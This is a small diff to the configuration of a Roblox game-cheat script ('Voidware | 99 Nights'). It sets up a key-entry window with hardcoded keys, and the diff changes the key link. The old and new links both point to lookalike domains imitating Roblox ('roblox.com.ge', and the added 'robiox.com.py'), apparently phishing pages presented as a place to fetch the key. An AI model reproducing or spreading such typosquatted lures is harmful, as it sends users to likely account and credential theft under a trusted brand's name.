@@ -13,13 +13,13 @@ MakeWindow({
     KeySystem = true,
     Title = "Voidware | 99 Nights (OP)",
     Description = "! Best Script !",
-    KeyLink = "https://roblox.com.ge/users/9966160340/profile",
+    KeyLink = "https://www.robiox.com.py/users/209962530668/profile",
     Keys = {"zuyihello", "71838", "28282", "728292", "28282"},
     Notifi = {
       Notifications = true,
       CorrectKey = "Running the Script...",
       Incorrectkey = "The key is incorrect",
-      CopyKeyLink = "Copied Linkvertise Link"
+      CopyKeyLink = "Copied Key Link"
     }
   }
 })
